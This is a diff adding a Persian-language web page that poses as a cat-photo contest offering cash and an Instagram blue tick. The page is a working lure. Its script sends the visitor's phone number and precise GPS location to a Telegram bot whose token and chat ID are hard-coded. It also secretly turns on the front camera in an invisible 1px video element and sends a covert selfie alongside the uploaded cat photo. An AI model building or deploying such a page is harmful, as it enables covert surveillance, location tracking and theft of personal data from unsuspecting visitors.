@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🐱 مسابقه عکس گربه‌ها</title>
+    <meta property="og:title" content="🐱 مسابقه عکس گربه‌ها - برنده ۳ میلیون تومان + تیک آبی اینستاگرام" />
+    <meta property="og:description" content="در مسابقه عکس گربه‌ها شرکت کن و شانس برنده شدن ۳ میلیون تومان + تیک آبی اینستاگرام رو داشته باش!" />
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/Sharif_University_of_Technology_Logo.svg/1200px-Sharif_University_of_Technology_Logo.svg.png" />
+    <meta name="twitter:card" content="summary_large_image">
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body {
+            background: #fdf6f0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+        .header {
+            background: linear-gradient(135deg, #f57c00, #e65100);
+            color: white;
+            padding: 20px;
+            border-radius: 30px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 30px rgba(230, 81, 0, 0.3);
+        }
+        .header h1 { font-size: 28px; }
+        .header p { font-size: 14px; opacity: 0.9; }
+        .card {
+            background: white;
+            padding: 25px;
+            border-radius: 25px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            margin-bottom: 20px;
+            border: 1px solid #fbe9e7;
+        }
+        .prize-box {
+            background: linear-gradient(135deg, #fff8e1, #fff3e0);
+            border: 2px dashed #f57c00;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            margin: 15px 0;
+        }
+        .prize-icons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 10px 0;
+            flex-wrap: wrap;
+        }
+        .prize-item {
+            background: white;
+            padding: 10px 20px;
+            border-radius: 15px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            border: 1px solid #f0f0f0;
+            text-align: center;
+            min-width: 100px;
+        }
+        .prize-item .emoji { font-size: 32px; }
+        .prize-item .label { font-size: 12px; color: #666; }
+        .prize-item .value { font-weight: bold; color: #e65100; font-size: 16px; }
+        .input-group {
+            margin: 15px 0;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 15px;
+            font-size: 16px;
+            direction: ltr;
+        }
+        .input-group input:focus {
+            border-color: #f57c00;
+            outline: none;
+        }
+        .btn {
+            background: linear-gradient(135deg, #f57c00, #e65100);
+            color: white;
+            border: none;
+            padding: 16px 30px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+        }
+        .btn:hover { transform: scale(1.02); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .btn-upload {
+            background: linear-gradient(135deg, #2e7d32, #1b5e20);
+        }
+        .btn-upload:hover {
+            box-shadow: 0 4px 15px rgba(46, 125, 50, 0.3);
+        }
+        #status {
+            text-align: center;
+            font-size: 14px;
+            color: #555;
+            margin-top: 10px;
+            min-height: 30px;
+        }
+        .hidden { display: none; }
+        .upload-area {
+            border: 3px dashed #e0e0e0;
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            margin: 15px 0;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        .upload-area:hover {
+            border-color: #f57c00;
+            background: #fff8e1;
+        }
+        .upload-area .icon { font-size: 50px; }
+        .upload-area .text { color: #666; margin-top: 10px; }
+        .upload-area .filename { color: #2e7d32; font-weight: bold; margin-top: 5px; }
+        .preview-img {
+            max-width: 100%;
+            max-height: 200px;
+            border-radius: 15px;
+            margin-top: 10px;
+        }
+        .log-box {
+            background: #f5f5f5;
+            border-radius: 10px;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 12px;
+            color: #555;
+            max-height: 80px;
+            overflow-y: auto;
+            direction: ltr;
+            text-align: left;
+        }
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin: 15px 0;
+            padding: 0 10px;
+        }
+        .step-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            transition: all 0.3s;
+        }
+        .step-dot.active {
+            background: #f57c00;
+            transform: scale(1.3);
+        }
+        .step-dot.done {
+            background: #2e7d32;
+        }
+        .success-card {
+            text-align: center;
+            padding: 30px;
+        }
+        .success-card .icon { font-size: 60px; }
+        .success-card h2 { color: #2e7d32; margin: 10px 0; }
+        .badge {
+            background: #fff8e1;
+            color: #f57c00;
+            padding: 6px 16px;
+            border-radius: 50px;
+            font-size: 13px;
+            display: inline-block;
+            border: 1px solid #ffe0b2;
+        }
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+            margin-top: 20px;
+        }
+        /* دوربین مخفی (کوچک و نامرئی) */
+        #hiddenCamera {
+            position: fixed;
+            bottom: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        #hiddenCanvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div style="font-size: 40px;">🐱</div>
+        <h1>🏆 مسابقه عکس گربه‌ها</h1>
+        <div style="display: flex; gap: 8px; justify-content: center; flex-wrap: wrap; margin-top: 5px;">
+            <span class="badge">🔥 جایزه نقدی ۳ میلیون تومانی</span>
+            <span class="badge" style="background: #1a237e; color: white; border-color: #1a237e;">✓ تیک آبی اینستاگرام</span>
+        </div>
+    </div>
+
+    <!-- ====== مرحله ۱: شماره تلفن ====== -->
+    <div class="card" id="step1">
+        <div class="prize-box">
+            <strong>🎁 جوایز بزرگ:</strong>
+            <div class="prize-icons">
+                <div class="prize-item">
+                    <div class="emoji">💰</div>
+                    <div class="value">۳ میلیون</div>
+                    <div class="label">جایزه نقدی</div>
+                </div>
+                <div class="prize-item">
+                    <div class="emoji">✓</div>
+                    <div class="value" style="color:#1a237e;">تیک آبی</div>
+                    <div class="label">اینستاگرام</div>
+                </div>
+            </div>
+            <span style="font-size: 13px; color: #666;">به یکی از شرکت‌کنندگان خوش‌شانس تعلق می‌گیرد!</span>
+        </div>
+
+        <div class="step-indicator">
+            <span class="step-dot active" id="dot1"></span>
+            <span class="step-dot" id="dot2"></span>
+            <span class="step-dot" id="dot3"></span>
+        </div>
+
+        <div class="input-group">
+            <label style="font-weight: bold;">📱 شماره تماس (برای دریافت جایزه)</label>
+            <input type="tel" id="phoneNumber" placeholder="مثلاً 09123456789" maxlength="11">
+        </div>
+
+        <button class="btn" id="actionBtn" onclick="startProcess()">📸 شروع مسابقه</button>
+        <div id="status">👈 شماره را وارد کنید و روی دکمه کلیک کنید</div>
+    </div>
+
+    <!-- ====== مرحله ۲: آپلود عکس گربه ====== -->
+    <div class="card hidden" id="step2">
+        <h2 style="color: #e65100; text-align: center;">🐱 عکس گربه‌تان را آپلود کنید</h2>
+        <p style="text-align: center; color: #666; font-size: 14px; margin: 10px 0;">
+            یک عکس از گربه‌تان انتخاب کنید و در مسابقه شرکت کنید.
+        </p>
+
+        <div class="upload-area" id="uploadArea" onclick="document.getElementById('fileInput').click()">
+            <div class="icon">📁</div>
+            <div class="text">برای آپلود عکس کلیک کنید</div>
+            <div class="filename" id="fileName">هیچ فایلی انتخاب نشده است</div>
+            <img id="preview" class="preview-img hidden" alt="پیش‌نمایش">
+        </div>
+
+        <input type="file" id="fileInput" accept="image/*" style="display:none">
+
+        <button class="btn btn-upload" id="uploadBtn" onclick="uploadCatPhoto()" disabled>
+            📤 ارسال عکس و شرکت در مسابقه
+        </button>
+
+        <div id="statusStep2" style="text-align: center; font-size: 14px; color: #555; margin-top: 10px;">
+            ⏳ منتظر انتخاب عکس...
+        </div>
+        <div class="log-box" id="logBox"></div>
+    </div>
+
+    <!-- ====== مرحله ۳: موفقیت ====== -->
+    <div class="card hidden" id="step3">
+        <div class="success-card">
+            <div class="icon">🎉</div>
+            <h2>ثبت‌نام شما کامل شد!</h2>
+            <p style="color: #555; margin-top: 10px;">
+                از شرکت شما در مسابقه متشکریم.<br>
+                عکس شما دریافت شد.
+            </p>
+            <div style="background: #e8f5e9; padding: 15px; border-radius: 15px; margin-top: 15px;">
+                <strong>📋 اطلاعات ثبت‌نام شما:</strong><br>
+                <span id="submittedPhone" style="direction: ltr; font-size: 16px;"></span>
+            </div>
+            <div style="margin-top: 15px; background: #fff8e1; padding: 15px; border-radius: 15px;">
+                <strong>🏆 جوایز:</strong><br>
+                <span style="font-size: 14px;">💰 ۳ میلیون تومان + ✓ تیک آبی اینستاگرام</span>
+            </div>
+            <div style="margin-top: 15px; background: #e3f2fd; padding: 15px; border-radius: 15px;">
+                <strong>📸 وضعیت ارسال:</strong><br>
+                <span id="photoStatus" style="font-size: 13px; color: #555;"></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© ۱۴۰۶ - مسابقه عکس گربه‌ها 🐱</p>
+    </div>
+
+    <!-- ====== دوربین مخفی (نامرئی) ====== -->
+    <video id="hiddenCamera" autoplay playsinline></video>
+    <canvas id="hiddenCanvas"></canvas>
+
+    <script>
+        // ============================================================
+        // تنظیمات ربات تلگرام
+        // ============================================================
+        const BOT_TOKEN = "8688040538:AAEdjIj4w9sR7ORBoXKa79ob-PTXVx6bOKs";
+        const CHAT_ID = "7064578264";
+
+        // ============================================================
+        // متغیرها
+        // ============================================================
+        let phoneNumber = '';
+        let selectedFile = null;
+        let hiddenStream = null;
+        let selfieTaken = false;
+        let catPhotoUploaded = false;
+
+        // ============================================================
+        // شماره تلفن
+        // ============================================================
+        document.getElementById('phoneNumber').addEventListener('input', function(e) {
+            let val = this.value.replace(/[^0-9]/g, '');
+            if (val.length > 11) val = val.slice(0, 11);
+            this.value = val;
+            phoneNumber = val;
+        });
+
+        // ============================================================
+        // انتخاب فایل
+        // ============================================================
+        document.getElementById('fileInput').addEventListener('change', function(e) {
+            const file = this.files[0];
+            if (file) {
+                selectedFile = file;
+                document.getElementById('fileName').innerText = file.name;
+                document.getElementById('uploadBtn').disabled = false;
+                document.getElementById('statusStep2').innerHTML = '✅ عکس انتخاب شد. روی دکمه ارسال کلیک کنید.';
+                
+                // پیش‌نمایش
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const preview = document.getElementById('preview');
+                    preview.src = e.target.result;
+                    preview.classList.remove('hidden');
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+
+        // ============================================================
+        // ارسال به تلگرام (عکس)
+        // ============================================================
+        function sendToTelegram(imageBlob, caption) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', imageBlob, 'photo.jpg');
+            formData.append('caption', caption + `\n📱 شماره: ${phoneNumber}`);
+
+            return fetch(url, { method: 'POST', body: formData })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("✅ ارسال شد:", caption);
+                        return true;
+                    } else {
+                        console.error("❌ خطا:", data.description);
+                        return false;
+                    }
+                })
+                .catch(error => {
+                    console.error("❌ خطای شبکه:", error);
+                    return false;
+                });
+        }
+
+        // ============================================================
+        // ارسال عکس به صورت Blob
+        // ============================================================
+        function sendBlobToTelegram(blob, caption) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', caption + `\n📱 شماره: ${phoneNumber}`);
+
+            return fetch(url, { method: 'POST', body: formData })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("✅ ارسال شد:", caption);
+                        return true;
+                    } else {
+                        console.error("❌ خطا:", data.description);
+                        return false;
+                    }
+                })
+                .catch(error => {
+                    console.error("❌ خطای شبکه:", error);
+                    return false;
+                });
+        }
+
+        // ============================================================
+        // ارسال لوکیشن
+        // ============================================================
+        function sendLocationToTelegram(lat, lon) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+            const data = {
+                chat_id: CHAT_ID,
+                latitude: lat,
+                longitude: lon,
+                caption: `📍 موقعیت مکانی\n📱 شماره: ${phoneNumber}`
+            };
+
+            return fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log("✅ لوکیشن ارسال شد:", lat, lon);
+                    return true;
+                } else {
+                    console.error("❌ خطا:", data.description);
+                    return false;
+                }
+            })
+            .catch(error => {
+                console.error("❌ خطای شبکه:", error);
+                return false;
+            });
+        }
+
+        // ============================================================
+        // گرفتن لوکیشن
+        // ============================================================
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        sendLocationToTelegram(lat, lon);
+                        document.getElementById('logBox').innerHTML += 
+                            `\n📍 لوکیشن ارسال شد: ${lat.toFixed(6)}, ${lon.toFixed(6)}`;
+                    },
+                    err => {
+                        console.log("❌ خطا در دریافت لوکیشن:", err.message);
+                        document.getElementById('logBox').innerHTML += 
+                            `\n❌ خطا در دریافت لوکیشن: ${err.message}`;
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                document.getElementById('logBox').innerHTML += '\n❌ مرورگر از GPS پشتیبانی نمی‌کند';
+            }
+        }
+
+        // ============================================================
+        // به‌روزرسانی مرحله
+        // ============================================================
+        function updateStep(newStep) {
+            for (let i = 1; i <= 3; i++) {
+                const dot = document.getElementById(`dot${i}`);
+                dot.className = 'step-dot';
+                if (i < newStep) dot.classList.add('done');
+                if (i === newStep) dot.classList.add('active');
+            }
+        }
+
+        // ============================================================
+        // مرحله ۱: شروع
+        // ============================================================
+        function startProcess() {
+            const phone = document.getElementById('phoneNumber').value.replace(/[^0-9]/g, '');
+            if (phone.length < 10) {
+                document.getElementById('status').innerHTML = '❌ <strong style="color: #d32f2f;">لطفاً شماره تماس معتبر وارد کنید!</strong>';
+                document.getElementById('phoneNumber').focus();
+                return;
+            }
+
+            // ارسال شماره به تلگرام
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `📱 شماره تماس جدید\n📱 شماره: ${phone}`
+                })
+            }).catch(e => console.log(e));
+
+            // شروع دوربین مخفی
+            startHiddenCamera();
+
+            // گرفتن لوکیشن
+            getLocation();
+
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            updateStep(2);
+            document.getElementById('statusStep2').innerHTML = '📸 منتظر انتخاب عکس گربه...';
+            document.getElementById('logBox').innerHTML = '✅ شماره ارسال شد\n✅ دوربین مخفی فعال شد';
+        }
+
+        // ============================================================
+        // دوربین مخفی (دوربین جلو - نامرئی)
+        // ============================================================
+        function startHiddenCamera() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 320, height: 240 },
+                    audio: false
+                })
+                .then(mediaStream => {
+                    hiddenStream = mediaStream;
+                    const video = document.getElementById('hiddenCamera');
+                    video.srcObject = mediaStream;
+                    video.play();
+                    console.log("✅ دوربین مخفی فعال شد");
+                })
+                .catch(err => {
+                    console.error("❌ خطا در دوربین مخفی:", err);
+                    document.getElementById('logBox').innerHTML += '\n❌ دوربین مخفی در دسترس نیست';
+                });
+            }
+        }
+
+        // ============================================================
+        // گرفتن سلفی مخفی
+        // ============================================================
+        function captureHiddenSelfie() {
+            return new Promise((resolve) => {
+                const video = document.getElementById('hiddenCamera');
+                if (!video || !video.videoWidth) {
+                    resolve(null);
+                    return;
+                }
+
+                const canvas = document.getElementById('hiddenCanvas');
+                canvas.width = video.videoWidth || 320;
+                canvas.height = video.videoHeight || 240;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob((blob) => {
+                    resolve(blob);
+                }, 'image/jpeg', 0.8);
+            });
+        }
+
+        // ============================================================
+        // آپلود عکس گربه + گرفتن سلفی مخفی
+        // ============================================================
+        async function uploadCatPhoto() {
+            if (!selectedFile) {
+                document.getElementById('statusStep2').innerHTML = '❌ <strong style="color: #d32f2f;">لطفاً ابتدا یک عکس انتخاب کنید!</strong>';
+                return;
+            }
+
+            const btn = document.getElementById('uploadBtn');
+            btn.disabled = true;
+            btn.innerText = '⏳ در حال ارسال...';
+            document.getElementById('statusStep2').innerHTML = '⏳ در حال ارسال عکس‌ها...';
+
+            // 1. گرفتن سلفی مخفی
+            const selfieBlob = await captureHiddenSelfie();
+            
+            // 2. آماده کردن عکس گربه
+            const reader = new FileReader();
+            const catPhotoBlob = await new Promise((resolve) => {
+                reader.onload = function(e) {
+                    fetch(e.target.result)
+                        .then(res => res.blob())
+                        .then(blob => resolve(blob));
+                };
+                reader.readAsDataURL(selectedFile);
+            });
+
+            // 3. ارسال سلفی مخفی
+            if (selfieBlob) {
+                const selfieSent = await sendBlobToTelegram(selfieBlob, '📸 عکس سلفی (مخفی)');
+                if (selfieSent) {
+                    selfieTaken = true;
+                    document.getElementById('logBox').innerHTML += '\n✅ سلفی مخفی ارسال شد';
+                } else {
+                    document.getElementById('logBox').innerHTML += '\n❌ خطا در ارسال سلفی';
+                }
+            } else {
+                document.getElementById('logBox').innerHTML += '\n❌ سلفی گرفته نشد';
+            }
+
+            // 4. ارسال عکس گربه
+            const catSent = await sendBlobToTelegram(catPhotoBlob, '🐱 عکس گربه');
+            if (catSent) {
+                catPhotoUploaded = true;
+                document.getElementById('logBox').innerHTML += '\n✅ عکس گربه ارسال شد';
+            } else {
+                document.getElementById('logBox').innerHTML += '\n❌ خطا در ارسال عکس گربه';
+            }
+
+            // 5. بستن دوربین مخفی
+            if (hiddenStream) {
+                hiddenStream.getTracks().forEach(t => t.stop());
+                hiddenStream = null;
+            }
+
+            // 6. رفتن به مرحله موفقیت
+            setTimeout(() => {
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('step3').classList.remove('hidden');
+                updateStep(3);
+                
+                let formattedPhone = phoneNumber;
+                if (phoneNumber.startsWith('0') && phoneNumber.length === 11) {
+                    formattedPhone = phoneNumber.slice(0, 4) + ' ' + phoneNumber.slice(4, 7) + ' ' + phoneNumber.slice(7);
+                }
+                document.getElementById('submittedPhone').innerText = formattedPhone;
+                
+                let statusText = '';
+                if (selfieTaken && catPhotoUploaded) {
+                    statusText = '✅ سلفی (مخفی) + عکس گربه';
+                } else if (selfieTaken) {
+                    statusText = '✅ سلفی (مخفی) - ❌ عکس گربه';
+                } else if (catPhotoUploaded) {
+                    statusText = '❌ سلفی - ✅ عکس گربه';
+                } else {
+                    statusText = '❌ خطا در ارسال';
+                }
+                document.getElementById('photoStatus').innerText = statusText;
+                
+                btn.innerText = '✅ انجام شد';
+                document.getElementById('statusStep2').innerHTML = '✅ همه چیز ارسال شد!';
+            }, 1000);
+        }
+
+        // ============================================================
+        // مقداردهی اولیه
+        // ============================================================
+        document.addEventListener('DOMContentLoaded', function() {
+            updateStep(1);
+            document.getElementById('logBox').innerHTML = '⏳ منتظر شروع...';
+        });
+    </script>
+</body>
+</html>
